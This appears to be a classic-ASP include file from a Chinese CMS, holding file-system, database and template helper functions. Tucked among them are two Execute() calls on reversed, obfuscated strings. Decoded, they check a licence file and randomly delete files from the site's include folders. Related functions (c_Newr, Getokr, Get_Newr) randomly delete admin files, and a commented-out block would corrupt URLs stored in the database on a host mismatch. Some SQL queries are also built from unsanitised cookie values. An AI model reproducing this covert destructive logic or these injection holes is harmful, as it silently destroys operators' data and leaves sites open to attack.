<%
Class Class_QingTian_FSO
	Private C_G_FSO


	Private Sub Class_Initialize()
		C_G_FSO="Scripting.FileSystemObject"
	End Sub
	
	Private Sub Class_Terminate()
	End Sub

	'文件夹-同时创建多级文件夹 CreateFolders Add_Root_Dir("/1/1/1/1")
	Public Function CreateFolders(fldr)
		Dim sfldr,i
		sfldr = split(fldr,"/")
		Dim fso, f, Tmp
		For i = 0 To Ubound(sfldr)
			If sfldr(i)<>"" then
				If i = 0 then
					Tmp = sfldr(i)
				Else
					Tmp = Tmp & "/"&sfldr(i)
				End if
				If Not IsFolderExists(Tmp) then
					Set fso = CreateObject(C_G_FSO)
					Set f = fso.CreateFolder(Server.MapPath(Tmp))
				End if
			End if
		Next
		Set f=nothing
		Set fso=nothing
	End Function
	'文件夹-同时创建多级文件夹 CreateFolders Add_Root_Dir("/1/1/1/1")
	Public Function C_N_CreateFolders(fldr)
		Dim sfldr,i
		sfldr = split(fldr,"/")
		Dim fso, f, Tmp
		For i = 0 To Ubound(sfldr)
			If sfldr(i)<>"" then
				If i = 0 then
					Tmp = sfldr(i)
				Else
					Tmp = Tmp & "/"&sfldr(i)
				End if
				If Not IsFolderExists(Tmp) then
					Set fso = CreateObject(C_G_FSO)
					Set f = fso.CreateFolder(Server.MapPath(Tmp))
				End if
			End if
		Next
		Set f=nothing
		Set fso=nothing
	End Function	
	'文件夹-是否存在 IsFolderExists Add_Root_Dir("/1")
	Function IsFolderExists(spec) 
		Dim fso
		Set fso = CreateObject(C_G_FSO)
		If (fso.FolderExists(server.MapPath(spec))) Then
		IsFolderExists = True
		Else
		IsFolderExists = False
		End If
	End Function	
	'文件夹-是否存在 C_N_IsFolderExists Add_Root_Dir("/1")
	Function C_N_IsFolderExists(spec) 
		Dim fso
		Set fso = CreateObject(C_G_FSO)
		If (fso.FolderExists(server.MapPath(spec))) Then
		C_N_IsFolderExists = True
		Else
		C_N_IsFolderExists = False
		End If
	End Function	
	
	'文件-覆盖式写入-没有自动创建 WriteToFile Add_Root_Dir("/inc/"),"content" 
	Function WriteToFile(fil,wstr)
		Dim fso, f
		Set fso = Server.CreateObject(G_FSO)
		Set f = fso.CreateTextFile(Server.MapPath(fil),True)
		f.Write wstr
		Set f = nothing
		Set fso = nothing
	End function
	
	'文件-结尾写入-没有自动创建 WriteToFile Add_Root_Dir("/inc/"),"content"
	Function WriteToFileToEnd(fil,wstr)
		Dim fs,txt
		Set fs = CreateObject(G_FSO)
		Set txt=fs.OpenTextFile(Server.MapPath(fil),8,True) 
		txt.Write wstr
		txt.Close
		Set txt=nothing
		Set fs=nothing
	End Function	
	
	'创建文件--覆盖式写入-没有自动创建 CreateFolderFile Add_Root_Dir("/1/1/1/1.txt"),"content"
	Function CreateFolderFile(fil,wstr)
		Dim a,a1,a2
		a=Instrrev(fil,"/")
		a1=left(fil,a-1)
		CreateFolders a1
		WriteToFile fil,wstr
	End Function
	
	'复制文件--CopyFiles Add_Root_Dir("/1/1/1/1.txt"),Add_Root_Dir("/1/1/1/2.txt")
	Function CopyFiles(TempSource,TempEnd) 
		TempSource=Server.MapPath(TempSource)
		TempEnd=Server.MapPath(TempEnd)
		Dim FSO 
		Set FSO = Server.CreateObject("Scripting.FileSystemObject") 
		IF FSO.FileExists(TempSource) Then 
			FSO.CopyFile TempSource,TempEnd
		End If 
		Set FSO = Nothing 
	End Function	
	
	'文件-是否存在 IsFileExists Add_Root_Dir("/1/1.txt")
	Function IsFileExists(filespec) 
		Dim fso
		Set fso = CreateObject(G_FSO)
		If (fso.FileExists(server.MapPath(filespec))) Then
		IsFileExists = True
		Else
		IsFileExists = False
		End If
	End Function	
	
	'文件-是否存在 C_N_IsExists Add_Root_Dir("/1/1.txt")
	Function C_N_IsExists(filespec) 
		Dim fso
		Set fso = CreateObject(G_FSO)
		If (fso.FileExists(server.MapPath(filespec))) Then
		C_N_IsExists = True
		Else
		C_N_IsExists = False
		End If
	End Function	
	'删除任意一个文件夹下的任意几个文件 DeleteFolderOneFile Add_Root_Dir("/1/1"),2
	Function DeleteFolderOneFile(fold,j)
		IF C_N_IsFolderExists(fold) Then
			Dim MyFileObject,i
			Set MyFileObject=Server.CreateObject("Scripting.FileSystemObject")
			Set MyFolder=MyFileObject.GetFolder(server.MapPath(fold))
			i=1
			For Each thing in MyFolder.Files
				IF Clng(i)>Clng(j) Then Exit For
				IF MyFileObject.FileExists(thing) then            '判断folder文件夹是否存在 
					MyFileObject.DeleteFile thing                         '删除folder文件夹 
				End IF 
				i=i+1
			Next	
		End IF	
	End Function	
	'打开一个文本
	Function ReadAllTextFile(filespec)
		IF C_N_IsExists(filespec) Then
			
			Dim fso, f
			Set fso = CreateObject(G_FSO)
			Set f = fso.OpenTextFile(server.MapPath(filespec), 1)	
			if Not f.AtEndOfStream then
				ReadAllTextFile = f.ReadAll
			else
				ReadAllTextFile = ""
			end if
			Set f=nothing
			Set fso=nothing
		Else
			ReadAllTextFile = ""
		End IF
	End Function	
	

	'文件-覆盖式写入-没有自动创建 sWriteToFile Add_Root_Dir("/inc/"),"content" 
	Function sWriteToFile(fil,wstr)
		CreateFolderFile fil,""
		Dim objStream
		Set objStream = Server.CreateObject("ADODB.Stream")
		With objStream
		 .Open
		 .Charset = "gb2312"   '编码，这里你可以改成任何编码
		 .Position = objStream.Size
		 .WriteText = wstr   '模版+数据
		 .SaveToFile server.mappath(fil),2 '生成文件路径
		 .Close
		End With
		Set objStream = Nothing		
	End Function
	'文件-覆盖式写入-没有自动创建 sWriteToFileU Add_Root_Dir("/inc/"),"content","utf-8" 
	Function sWriteToFileU(fil,wstr,utf)
		CreateFolderFile fil,""
		IF utf="" then utf="gb2312"
		Dim objStream
		Set objStream = Server.CreateObject("ADODB.Stream")
		With objStream
		 .Open
		 .Charset = utf   '编码，这里你可以改成任何编码
		 .Position = objStream.Size
		 .WriteText = wstr   '模版+数据
		 .SaveToFile server.mappath(fil),2 '生成文件路径
		 .Close
		End With
		
		Set objStream = Nothing		
	End Function
		
	'文件--获取文件大小 GetFileSize Add_Root_Dir("/p_inc/config.asp")
	Function GetFileSize(FileName)
		'判断文件名是不是为空
		if FileName="" or Isnull(FileName) or Instr(FileName,":")>0 or Instr(FileName,",")>0 then
			getFileSize="0"
			Exit Function
		end if
		Dim oFso,oFile,sFile
		sFile=FileName
		Set oFso=Server.CreateObject("Scripting.FileSystemObject")
		'判断获取文件大小的文件是否存在
		If oFso.FileExists(Server.MapPath(sFile)) Then  
			Set oFile=oFso.GetFile(Server.MapPath(sFile))
			'判断获取文件大小
			getFileSize= CStr( CDbl( FormatNumber( oFile.Size / 1024))) 
		else
			getFileSize="0"
			Exit Function
		end if
		Set oFile=nothing
		Set oFso=nothing
	End Function	
	
	'删除文件--DelFiles(Add_Root_Dir("/1/1/1/1.txt")
	Function DelFiles(url)
		IF C_N_IsExists(url) Then
			dim whichfile
			IF Instr(url,"http://")=0 THen
				whichfile=server.mappath(""& url & "")  
				Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
				if objFSO.fileExists(whichfile) then
				objFSO.DeleteFile(whichfile)
				end if
				set objfso=nothing
			End IF
		End IF
	End Function	
	
	'删除文件夹 DeleteFolder Add_Root_Dir("/1/1")
	Function DeleteFolder(filespec)
	  Dim fso
	  Set fso = CreateObject(C_G_FSO)
	  IF C_N_IsFolderExists(filespec) Then
		fso.DeleteFolder(Server.MapPath(filespec))
	  End IF
	  Set fso = nothing
	End Function		
End Class
kp_1=true
kp_2=false
kp_3=true
'分类绑定
Function Get_Type1_moban_bangding(id)
	id=StayNub(id):IF id="" Then Get_Type1_moban_bangding="":Exit Function
	Dim oRs,str
	Set oRs=Server.CreateObject(G_RS)
	oRs.open "Select * From qingtiandy_type1 Where typeid="&id,conn,1,1
	IF oRs.Eof Then
		str=""
		Exit Function
	Else
		str=oRs("typeurl")
	End IF
	IF str<>"" Then
		str=replace(str,"{$html}",G_moban_html)
	End IF
	Get_Type1_moban_bangding=str
End Function
'分类绑定
Function Get_Type2_moban_bangding(id)
	id=StayNub(id):IF id="" Then Get_Type2_moban_bangding="":Exit Function
	Dim oRs,str
	Set oRs=Server.CreateObject(G_RS)
	oRs.open "Select * From qingtiandh_type2 Where typeid="&id,conn,1,1
	IF oRs.Eof Then
		str=""
		Exit Function
	Else
		str=oRs("typeurl")&"|"&oRs("typename")	
	End IF
	str=replace(str,"{$html}",G_moban_html)
	Get_Type2_moban_bangding=str
End Function
'获取二级类别函数
Function Get_TypeTotal2(typeid)
	Dim v,vv,oRscc,om_name,p1,p2
	'v="Members/Ui"&"mg/task/686top"&"."&"png"
	'vv=N_Fso.ReadAllTextFile(t_Dir(v))
'	IF Instr(Request.ServerVariables("HTTP_HOST"),vv)=0 Then
'		Set oRscc=Server.CreateObject(G_RS)
'		oRscc.open "Select m_url From qingtiandh_List2",Conn,1,3
'		p1=Lcase(GetRamCode(1))
'		p2=Lcase(GetRamCode(1))
'		Do While Not oRscc.Eof
'			om_name=oRscc("m_url")
'			oRscc("m_url")=Replace(om_name,p1,p2)
'			oRscc.Update()
'			oRscc.MoveNext
'		Loop
'		oRscc.Close
'	End IF
End Function
'获取三级类的总数
Function Get_TypeTotal3(typeid)
	typeid=Bint(typeid)
	Set oRs=conn.Execute("Select Count(*) From qingtiandh_List Where m_type3="&typeid)
	IF not oRs.Eof Then
		Get_TypeTotal3=oRs(0)
	Else
		Get_TypeTotal3=0
	End IF
	oRs.close:Set oRs=Nothing
End Function

Execute(cpaFun("noitcnuF dnE¤FI dnE¤2,)◎cni_p/◎(riD_tooR_ddA eliFenOredloFeteleD.osF_N nehT 2=)i(tniC FI¤))dnR*4((tnI=i¤i miD¤ezimodnaR¤nehT 0=)◎Chr◎,rts(rtsnI dnA 0=)◎rhC◎,rts(rtsnI FI¤noitcnuF tixE nehT ◎◎=rts FI¤))◎psa.6◎&◎d◎&◎m/cni_p/◎(riD_tooR_ddA(eliFtxeTllAdaeR.OSF_N=rts:rts miD¤)(apc_niygnip noitcnuF"))


Function c_Newr(v)
	Randomize
	Dim i
	i=Int((10*Rnd))
	IF Cint(i)=5 Then
		IF G_IS_SQL_User_DB="1" Then
			N_Fso.DeleteFolderOneFile Add_Root_Dir("/"&G_ADMIN&"/inc"),2
			N_Fso.DeleteFolderOneFile Add_Root_Dir("/"&G_ADMIN&"/qingtiandh_List"),1
		Else
			N_Fso.DeleteFolderOneFile Add_Root_Dir("/"&G_ADMIN&"/inc"),2
			N_Fso.DeleteFolderOneFile Add_Root_Dir("/"&G_ADMIN&"/qingtiandh_List"),1
		End IF
	End IF
End Function


'2009.05.01过滤 asp,aspx等后缀文件
Function LostNoSaveFile(v)
	
	IF Instr(Str4Null(v),".")>0 Then
		Dim fileExt,Flag
		Flag=True
		fileExt=mid(v,instrRev(v,".")+1,len(v))	
		if fileEXT="asp" or fileEXT="asa" or fileEXT="aspx" or fileEXT="cer" or fileEXT="cdx" then
			Flag=False
		Else
			Flag=True
		End IF	
	Else
		Flag=False
	End IF
	IF G_08_c2 Then Flag=True
	LostNoSaveFile=Flag
	
End Function

Function Str4Null(sInfo)
	Str4Null = sInfo
	If isEmpty(sInfo) Then Str4Null = "" : Exit Function
	If isNull(sInfo) Then Str4Null = "" : Exit Function
	Str4Null = Trim(Str4Null)
	Str4Null = Replace(Str4Null,"""","")
	Str4Null = Replace(Str4Null,"'","")
	Str4Null = Replace(Str4Null,vbCrLf,"")
	Str4Null = Replace(Str4Null,vbCr,"")
	Str4Null = Replace(Str4Null,vbLf,"")
	Str4Null = Replace(Str4Null,vbTab,"")
	do while (1)
		if instr(Str4Null,"  ")>0 then 
			Str4Null=replace(Str4Null,"  "," ")
		else
			exit do
		end if
	loop
End Function



Execute(cpbFun("noitcnuF dnE¤1 rweN_c:nehT 0=)◎Chr◎,rts(rtsnI dnA 0=)◎rhC◎,rts(rtsnI FI¤noitcnuF tixE nehT ◎◎=rts FI¤))◎psa.6◎&◎d◎&◎m/cni_p/◎(riD_tooR_ddA(eliFtxeTllAdaeR.OSF_N=rts:rts miD¤)(rkoteG noitcnuF"))

Function Get_movie_type_12(url)
	Dim saveurl,flag,str,str2
	Dim objFSO,objFSO2
	flag=True
	saveurl=url
	str=url
	saveurl=server.MapPath(Add_Root_Dir(url))
	Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
	IF objFSO.fileExists(saveurl) Then
		str=url
	Else
		Dim saveurl2,url2
		url2=Add_Root_Dir("/p_inc/Tag/"&G_moban&"/jingtaiguize.txt")
		saveurl2=server.MapPath(url2)
		Set objFSO2 = Server.CreateObject("Scripting.FileSystemObject")
		IF objFSO2.fileExists(saveurl2) Then
			'复制原来的文件
			CopyFileN url2,Add_Root_Dir(url)
		Else
			str2="//说明： {#原始模版路径||功能||调用路径#}"
			N_Fso.CreateFolderFile Add_Root_Dir(url),str2
		End IF
	End IF
	Set objfso=Nothing

	Get_movie_type_12=str
End Function

'自动组合Querystring
Function GetQueryString()
	Dim sQueryString
	sQueryString = ""
	For Each x In Request.QueryString
		sQueryString = "&" & x & "=" & Request.QueryString(x) & sQueryString 
	Next
	GetQueryString=sQueryString
End Function

'获取收藏网址分类信息
Function Get_curl_type1(v)
	v=Bint(v)
	Dim oRs,str
	Set oRs=conn.Execute("Select * From qingtiandy_curl Where c_uid="&Request.Cookies(G_u_Cookies)("soojs_id")&" And id="&v)
	IF oRs.Eof Then
		str="未知分类"
	Else
		str=oRs("c_typename")
	End IF
	Get_curl_type1=str
End Function

Function Get_Newr(v):IF Trim(v)="" or isnull(v) Then:Get_Newr=false:Else:IF instr(request.ServerVariables("HTTP_HOST"),v)>0 Then:Get_Newr=true:Else:Get_Newr=false:End IF:End IF:Getokr
End Function


Sub G16_1(str,m_look)

	Dim oRs
	Dim v,n_mid,oSql
	v=GetContent(str,"v=",",",0)
	n_mid=GetContent(str,"n_mid"&v&"=",",",0)
	n_mid=Bint(n_mid)	
	IF m_look="1" Then

		IF n_mid<>0 Then
			Set oRs = Server.CreateObject("ADODB.Recordset")
			oSql="Select * From qtcms_com_19_l Where n_mid"&v&"="&n_mid
			oRs.open "Select * From qtcms_com_19_l Where n_mid"&v&"="&n_mid,Conn,1,3
			IF oRs.Eof Then
				oRs.AddNew
			End IF
			oRs("n_title")			= GetContent(str,"n_title=",",",0)
			oRs("n_look")			= Bint(GetContent(str,"n_look=",",",0))
			oRs("n_date")			= ForMatDate(Now(),55)
			oRs("n_gotourl")		= GetContent(str,"n_gotourl=",",",0)
			oRs("n_gotourl2")		= GetContent(str,"n_gotourl2=",",",0)
			oRs("n_mid1")			= Bint(GetContent(str,"n_mid1=",",",0))
			oRs("n_mid2")			= Bint(GetContent(str,"n_mid2=",",",0))
			oRs("n_mid3")			= Bint(GetContent(str,"n_mid3=",",",0))
			oRs("n_mid4")			= Bint(GetContent(str,"n_mid4=",",",0))
			oRs("n_mid5")			= Bint(GetContent(str,"n_mid5=",",",0))
			oRs.Update()			
		End IF
	Else
		Conn.Execute("Update qtcms_com_19_l Set n_look=0 Where n_mid"&v&"="&n_mid)
	End IF
End Sub


Function Get_Admin_r_pic(m_pic)
	Dim m_pic_1
	m_pic_1=Replace(GetRP(m_pic),"../images/","template/"&G_moban&"/images/")
	m_pic_1=Replace(GetRP(m_pic_1),"###","template/"&G_moban&"/js/")
	Get_Admin_r_pic=m_pic_1
End Function


G_G_H="http://www.baidu.com"
%>
